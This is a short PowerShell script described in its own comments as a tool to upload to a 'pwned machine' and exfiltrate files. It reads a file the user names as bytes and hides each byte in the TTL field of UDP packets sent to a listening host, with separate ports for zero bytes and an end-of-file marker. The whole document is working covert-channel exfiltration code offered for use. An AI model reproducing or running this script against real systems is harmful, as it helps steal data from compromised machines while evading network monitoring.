# Binary File Sender 
# Notes: File to be uploaded to pwned machine to convert files to binary and then exfiltrate them via packets

# Create packet infomation to be sent
$Port = 12505
$Port2 = 12507
$targetIP = "192.168.217.131"
$Address = [system.net.IPAddress]::Parse($targetIP)

$exFile = Read-Host -Prompt "Enter full path of file to be exfiltrated: "
# Create Endpoint
$endPoint = New-Object System.Net.IPEndPoint $address, $port
$endPoint2 = New-Object System.Net.IPEndPoint $address, $port2 

# Create Socket
$sockAddr = [System.Net.Sockets.AddressFamily]::InterNetwork
$sockType = [System.Net.Sockets.SocketType]::Dgram
$protoType = [System.Net.Sockets.ProtocolType]::UDP
$Sock = New-Object System.Net.Sockets.Socket $sockAddr, $sockType, $protoType
# Create Additional Socket 
$sockAddr2 = [System.Net.Sockets.AddressFamily]::InterNetwork
$sockType2 = [System.Net.Sockets.SocketType]::Dgram
$protoType2 = [System.Net.Sockets.ProtocolType]::UDP
$Sock2 = New-Object System.Net.Sockets.Socket $sockAddr2, $sockType2, $protoType2
#$Sock.TTL = 26

# Get binary version of file content into array
$binArray = Get-Content $exFile -Encoding Byte
# For testing purposes, create file to allow counting of binary chunks
Get-Content $exFile -Encoding Byte > .\test_bin_file.txt

For ($i = 0; $i -lt $binArray.length; $i++) {

	If ($binArray[$i] -gt 0) {
	
		#Write-Host $binArray[$i]
		$Sock.TTL = $binArray[$i]
		# Connect to socket
		$Sock.Connect($endPoint)

		# Create datagram
		$Enc = [System.Text.Encoding]::ASCII
		$Message = "Test`n" 
		$Buffer = $Enc.GetBytes($Message)

		# Send packet
		$Sent = $Sock.Send($Buffer)
		Write-Host "Sent packet"
	}
	If ($binArray[$i] -eq 0) {
		$Sock2.TTL = 128 
		# Connect to Socket 
		$Sock2.Connect($endPoint2)
		$Sent2 = $Sock2.Send($Buffer)
	}
}
#Send EOF packets
$Sock2.TTL = 255
# Connect to socket
$Sock2.Connect($endPoint2)

# Send packet
$Sent2 = $Sock2.Send($Buffer)
Write-Host "Sent packet EOF"
